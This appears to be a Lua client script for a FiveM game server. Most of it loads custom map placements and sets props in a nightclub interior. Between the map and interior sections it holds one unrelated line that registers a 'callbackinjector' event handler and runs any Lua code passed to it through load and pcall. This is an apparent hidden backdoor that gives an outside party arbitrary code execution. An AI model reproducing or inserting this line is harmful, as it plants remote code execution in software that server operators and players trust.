	RequestIpl("DisneyPinkCageMotel_05")
	RequestIpl("DisneyPinkCageMotel_06")
	RequestIpl("DisneyPinkCageMotel_07")
	RequestIpl("DisneyPinkCageMotel_08")
	RequestIpl("DisneyPinkCageMotel_09")
	RequestIpl("DisneyPinkCageMotel_10")
	RequestIpl("DisneyPinkCageMotel_11")
	RequestIpl("DisneyPinkCageMotel_12")
	RequestIpl("DisneyPinkCageMotel_13")
	RequestIpl("DisneyPinkCageMotel_14")
	RequestIpl("DisneyPinkCageMotel_15")
	RequestIpl("DisneyPinkCageMotel_16")
	RequestIpl("DisneyPinkCageMotel_17")
	RequestIpl("DisneyPinkCageMotel_18")
	RequestIpl("DisneyPinkCageMotel_19")
	RequestIpl("DisneyPinkCageMotel_20")
	RequestIpl("DisneyPinkCageMotel_21")
	RequestIpl("DisneyPinkCageMotel_22")
	RequestIpl("DisneyPinkCageMotel_23")
	RequestIpl("DisneyPinkCageMotel_24")
	RequestIpl("DisneyPinkCageMotel_25")
	RequestIpl("DisneyPinkCageMotel_26")
	RequestIpl("DisneyPinkCageMotel_27")
	RequestIpl("DisneyPinkCageMotel_28")
	RequestIpl("DisneyPinkCageMotel_29")
	RequestIpl("DisneyPinkCageMotel_30")
	RequestIpl("DisneyPinkCageMotel_31")
	RequestIpl("DisneyPinkCageMotel_32")
	RequestIpl("DisneyPinkCageMotel_33")
	RequestIpl("DisneyPinkCageMotel_34")
	RequestIpl("DisneyPinkCageMotel_35")
	RequestIpl("DisneyPinkCageMotel_36")
	RequestIpl("DisneyPinkCageMotel_37")
	RequestIpl("DisneyPinkCageMotel_38")

	--DisneySandyShore
	RequestIpl("DisneySandyShore_01")

	--DisneyVagosHouse
	RequestIpl("DisneyVagosHouse_01")
	RequestIpl("DisneyVagosHouse_02")
	RequestIpl("DisneyVagosHouse_03")
	RequestIpl("DisneyVagosHouse_04")
	RequestIpl("DisneyVagosHouse_05")
	RequestIpl("DisneyVagosHouse_06")
	RequestIpl("DisneyVagosHouse_07")
	RequestIpl("DisneyVagosHouse_08")
	RequestIpl("DisneyVagosHouse_09")
	RequestIpl("DisneyVagosHouse_11")
	RequestIpl("DisneyVagosHouse_12")
	RequestIpl("DisneyVagosHouse_13")
	RequestIpl("DisneyVagosHouse_14")
	RequestIpl("DisneyVagosHouse_15")
	RequestIpl("DisneyVagosHouse_16")
	RequestIpl("DisneyVagosHouse_17")
	RequestIpl("DisneyVagosHouse_18")
	RequestIpl("DisneyVagosHouse_19")
	RequestIpl("DisneyVagosHouse_20")
	RequestIpl("DisneyVagosHouse_21")
	RequestIpl("DisneyVagosHouse_22")
	RequestIpl("DisneyVagosHouse_23")
	RequestIpl("DisneyVagosHouse_24")
	RequestIpl("DisneyVagosHouse_25")
	RequestIpl("DisneyVagosHouse_26")
	RequestIpl("DisneyVagosHouse_27")
	RequestIpl("DisneyVagosHouse_28")
	RequestIpl("DisneyVagosHouse_29")
	RequestIpl("DisneyVagosHouse_30")
	RequestIpl("DisneyVagosHouse_31")
	RequestIpl("DisneyVagosHouse_32")
	RequestIpl("DisneyVagosHouse_33")
	RequestIpl("DisneyVagosHouse_34")
	RequestIpl("DisneyVagosHouse_35")

	--DisneyVagosMotel	
	RequestIpl("DisneyVagosMotel_01")
	RequestIpl("DisneyVagosMotel_02")
	RequestIpl("DisneyVagosMotel_03")
	RequestIpl("DisneyVagosMotel_04")
	RequestIpl("DisneyVagosMotel_05")
	RequestIpl("DisneyVagosMotel_06")
	RequestIpl("DisneyVagosMotel_07")
	RequestIpl("DisneyVagosMotel_08")
	RequestIpl("DisneyVagosMotel_09")
	RequestIpl("DisneyVagosMotel_10")
	RequestIpl("DisneyVagosMotel_11")
	RequestIpl("DisneyVagosMotel_12")
	RequestIpl("DisneyVagosMotel_13")
	RequestIpl("DisneyVagosMotel_14")
	RequestIpl("DisneyVagosMotel_15")
	RequestIpl("DisneyVagosMotel_16")
	RequestIpl("DisneyVagosMotel_17")
	RequestIpl("DisneyVagosMotel_18")
	RequestIpl("DisneyVagosMotel_19")
	RequestIpl("DisneyVagosMotel_20")
	RequestIpl("DisneyVagosMotel_21")
	RequestIpl("DisneyVagosMotel_22")
	RequestIpl("DisneyVagosMotel_23")
	RequestIpl("DisneyVagosMotel_24")
	RequestIpl("DisneyVagosMotel_25")
	RequestIpl("DisneyVagosMotel_26")
	RequestIpl("DisneyVagosMotel_27")
	RequestIpl("DisneyVagosMotel_28")
	RequestIpl("DisneyVagosMotel_29")
	RequestIpl("DisneyVagosMotel_30")
	RequestIpl("DisneyVagosMotel_31")
	RequestIpl("DisneyVagosMotel_32")
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)

local int_id = GetInteriorAtCoords(345.4899597168,294.95315551758,98.191421508789)

-- GALAXY
EnableInteriorProp(int_id , "Int01_ba_security_upgrade")
EnableInteriorProp(int_id , "Int01_ba_equipment_setup")
DisableInteriorProp(int_id , "Int01_ba_Style01") -- дешовый
DisableInteriorProp(int_id , "Int01_ba_Style02") -- средний
EnableInteriorProp(int_id , "Int01_ba_Style03") -- дорогой
DisableInteriorProp(int_id , "Int01_ba_style01_podium") -- дешовый
DisableInteriorProp(int_id , "Int01_ba_style02_podium") -- средний
EnableInteriorProp(int_id , "Int01_ba_style03_podium") -- дорогой
EnableInteriorProp(int_id , "int01_ba_lights_screen")
EnableInteriorProp(int_id , "Int01_ba_Screen")
EnableInteriorProp(int_id , "Int01_ba_bar_content")
DisableInteriorProp(int_id , "Int01_ba_booze_01") --мусор после вечеринки
DisableInteriorProp(int_id , "Int01_ba_booze_02") --мусор после вечеринки
DisableInteriorProp(int_id , "Int01_ba_booze_03") --мусор после вечеринки
DisableInteriorProp(int_id , "Int01_ba_dj01")
DisableInteriorProp(int_id , "Int01_ba_dj02")
EnableInteriorProp(int_id , "Int01_ba_dj03")
DisableInteriorProp(int_id , "Int01_ba_dj04")

EnableInteriorProp(int_id , "DJ_01_Lights_01")
DisableInteriorProp(int_id , "DJ_01_Lights_02")
DisableInteriorProp(int_id , "DJ_01_Lights_03")
DisableInteriorProp(int_id , "DJ_01_Lights_04")

DisableInteriorProp(int_id , "DJ_02_Lights_01")
EnableInteriorProp(int_id , "DJ_02_Lights_02")
DisableInteriorProp(int_id , "DJ_02_Lights_03")
DisableInteriorProp(int_id , "DJ_02_Lights_04")

DisableInteriorProp(int_id , "DJ_03_Lights_01")
DisableInteriorProp(int_id , "DJ_03_Lights_02")
EnableInteriorProp(int_id , "DJ_03_Lights_03")
DisableInteriorProp(int_id , "DJ_03_Lights_04")

DisableInteriorProp(int_id , "DJ_04_Lights_01")
DisableInteriorProp(int_id , "DJ_04_Lights_02")
DisableInteriorProp(int_id , "DJ_04_Lights_03")
EnableInteriorProp(int_id , "DJ_04_Lights_04")

DisableInteriorProp(int_id , "light_rigs_off")
EnableInteriorProp(int_id , "Int01_ba_lightgrid_01")
DisableInteriorProp(int_id , "Int01_ba_Clutter")
EnableInteriorProp(int_id , "Int01_ba_equipment_upgrade")
EnableInteriorProp(int_id , "Int01_ba_clubname_01") -- galaxy
DisableInteriorProp(int_id , "Int01_ba_clubname_02") --studio
DisableInteriorProp(int_id , "Int01_ba_clubname_03") --omega
DisableInteriorProp(int_id , "Int01_ba_clubname_04") --tehnology
DisableInteriorProp(int_id , "Int01_ba_clubname_05") --gefangnis
DisableInteriorProp(int_id , "Int01_ba_clubname_06") --maisonnette
DisableInteriorProp(int_id , "Int01_ba_clubname_07") -- tony 
DisableInteriorProp(int_id , "Int01_ba_clubname_08") -- the palace
DisableInteriorProp(int_id , "Int01_ba_clubname_09") -- paradise

EnableInteriorProp(int_id , "Int01_ba_dry_ice")
DisableInteriorProp(int_id , "Int01_ba_deliverytruck")
DisableInteriorProp(int_id , "Int01_ba_trophy04")
DisableInteriorProp(int_id , "Int01_ba_trophy05")
DisableInteriorProp(int_id , "Int01_ba_trophy07")
DisableInteriorProp(int_id , "Int01_ba_trophy09")
DisableInteriorProp(int_id , "Int01_ba_trophy08")
DisableInteriorProp(int_id , "Int01_ba_trophy11")
DisableInteriorProp(int_id , "Int01_ba_trophy10")
DisableInteriorProp(int_id , "Int01_ba_trophy03")
DisableInteriorProp(int_id , "Int01_ba_trophy01")
DisableInteriorProp(int_id , "Int01_ba_trophy02")
DisableInteriorProp(int_id , "Int01_ba_trad_lights")
DisableInteriorProp(int_id , "Int01_ba_Worklamps") -- работа
RefreshInterior(int_id )